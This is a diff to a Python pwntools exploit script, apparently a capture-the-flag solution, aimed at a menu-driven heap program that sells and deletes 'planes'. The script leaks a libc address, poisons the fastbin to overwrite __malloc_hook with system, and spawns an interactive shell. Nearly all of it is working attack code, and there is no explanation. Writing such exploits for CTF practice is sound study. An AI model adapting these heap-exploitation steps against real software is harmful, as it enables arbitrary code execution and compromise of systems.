@@ -13,7 +13,7 @@ def sell_plane(r, sz, name):
     r.sendlineafter('7. Exit\n> ', '1')
     r.sendlineafter('size:',str(sz))
     r.sendafter('name:',name)
-    r.sendlineafter('cost:',str(0x6873))
+    r.sendlineafter('cost:','1')
     r.sendlineafter('[Y\N]:','N')
 
 def delete_plane(r, idx):
@@ -37,40 +37,35 @@ def change_name(r, idx, name):
 def exploit(r):
     r.sendlineafter(':', 'ke2ek') # name
     sell_plane(r, 0x4f0, 'a') # 0
-    sell_plane(r, 0x60, 'b') # 1
-    sell_plane(r, 0x4f0, 'c') # 2
-    sell_plane(r, 0x30, 'd') # 3
-    sell_plane(r, 0x60, 'e') # 4
-    change_name(r, 4, 'a')
-    sleep(1)
-    delete_plane(r, 2)
-    sleep(1)
+    sell_plane(r, 0x30, 'b') # 1
+    sell_plane(r, 0x60, 'd') # 2
+    sell_plane(r, 0x60, 'e') # 3
+    change_name(r, 3, 'a')
+    delete_plane(r, 0)
     r.sendlineafter('7. Exit\n> ', '1')
     r.sendlineafter('size:','0')
-    r.sendlineafter('cost:','1')
+    r.sendlineafter('cost:',str(0x6873))
     r.sendlineafter('[Y\N]:','N')
-    view_plane(r, 2)
+    view_plane(r, 0)
 
-    r.recvuntil('---- Plane [2] ----\nName: ')
+    r.recvuntil('---- Plane [0] ----\nName: ')
     leak_addr = u64(r.recvn(6).ljust(8,'\x00'))
     libc.address = leak_addr - 0x1ba0d0
-    target = libc.sym['__malloc_hook'] - 0x23 + 0x20
+    target = libc.sym['__malloc_hook'] - 0x3
     log.info('leak addr: {:#x}'.format(leak_addr))
     log.info('libc base: {:#x}'.format(libc.address))
     log.info('target: {:#x}'.format(target))
 
-    delete_plane(r, 1) # fastbin -> 1
-    delete_plane(r, 4) # fastbin -> 4 -> 1
-    change_name(r, 4, p64(target))
+    delete_plane(r, 2) # fastbin -> 2
+    delete_plane(r, 3) # fastbin -> 3 -> 2
+    change_name(r, 3, p64(target))
     sell_plane(r, 0x60, 'f') 
 
     r.sendlineafter('7. Exit\n>', '1')
     r.sendlineafter('size:',str(0x60))
     r.sendlineafter('name:',"\x7f\x00\x00" + p64(libc.sym['system']))
     r.sendlineafter('cost:','1')
-    r.sendlineafter('[Y\N]:','N')
-
-    r.sendlineafter('7. Exit\n>', '1')
+    r.sendlineafter('[Y\N]:','Y')
     r.sendlineafter('size:',str(0x4040e8))
     pause()
     r.interactive()
@@ -91,6 +86,8 @@ if __name__ == '__main__':
         r = process(cmd)
         gdb.attach(r, gdbscript='''
                 b *0x401192
+		b *0x40171a
+		b *0x40186a
         ''')
     exploit(r)
 
